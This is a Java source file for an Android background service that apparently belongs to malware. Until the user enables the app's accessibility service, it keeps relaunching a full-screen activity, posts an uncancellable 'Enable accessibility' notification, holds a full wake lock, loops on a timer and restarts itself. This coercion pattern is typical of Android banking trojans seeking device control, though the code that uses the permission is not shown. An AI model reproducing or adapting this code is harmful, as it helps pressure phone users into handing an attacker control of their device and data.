package com.service.app.Services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Binder;
import android.os.Handler;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Log;
import androidx.annotation.Nullable;

import com.service.app.Main.AccessActivity;
import com.service.app.R;
import com.service.app.Services.Access;
import com.service.app.Services.utils;
import com.service.app.defines;

import org.json.JSONObject;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;
import okio.ByteString;
import java.util.concurrent.TimeUnit;

public class HintService extends Service {

    private static final String TAG = HintService.class.getSimpleName();
    private boolean isServiceRunning = false;
    private PowerManager.WakeLock wakeLock;

    defines consts = new defines();
    utils utl = new utils();

    private Handler handler;
    private Runnable runnable;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!isServiceRunning) {
            acquireWakeLock();
            isServiceRunning = true;
            handler = new Handler();
            runnable = new Runnable() {
                @Override
                public void run() {
                    if (!utl.isAccessibilityServiceEnabled(getApplicationContext(), Access.class)) {

                        NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
                        notificationManager.cancelAll();


                        NotificationChannel mChannel = null;
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                            mChannel = notificationManager.getNotificationChannel("test");
                            if (mChannel == null) {
                                mChannel = new NotificationChannel("test", "test", NotificationManager.IMPORTANCE_HIGH);
                                notificationManager.createNotificationChannel(mChannel);
                            }

                            Notification.Builder builder = new Notification.Builder(getApplicationContext(), "test").setTicker("Enable accessibility")
                                    .setSmallIcon(R.mipmap.ic_launcher)
                                    .setContentTitle(consts.hint_notify_title)
                                    .setContentText(consts.hint_notify_text)
                                    .setOngoing(true)
                                    .setAutoCancel(true);

                            Intent fullScreenIntent = new Intent(getApplicationContext(), AccessActivity.class)
                                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                    .addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
                                    .addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
                            fullScreenIntent.putExtra("fromNotification", true);
                            fullScreenIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
                            PendingIntent Notifyintent = PendingIntent.getActivity(getApplicationContext(), 0, fullScreenIntent, PendingIntent.FLAG_IMMUTABLE);

                            builder.setContentIntent(Notifyintent);

                            Notification notification = builder.build();
                            notification.flags |= Notification.FLAG_NO_CLEAR;
                            notificationManager.notify(782, notification);
                        }

                        try {
                            startActivity(new Intent(getApplicationContext(), AccessActivity.class)
                                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                    .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)
                                    .addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
                                    .addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY));
                        } catch (Exception e){
                            Log.d(TAG, "Error on start hint again: " + e.toString());
                        }


                        handler.postDelayed(this, consts.hint_reoccure_delay);
                    } else {
                        NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
                        notificationManager.cancelAll();
                        stopSelf();
                    }
                }
            };

            handler.post(runnable);
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        releaseWakeLock();
    }

    private void acquireWakeLock() {
        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = powerManager.newWakeLock(PowerManager.FULL_WAKE_LOCK, "HintService::WakeLock");
        wakeLock.acquire();
    }

    private void releaseWakeLock() {
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
            wakeLock = null;
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
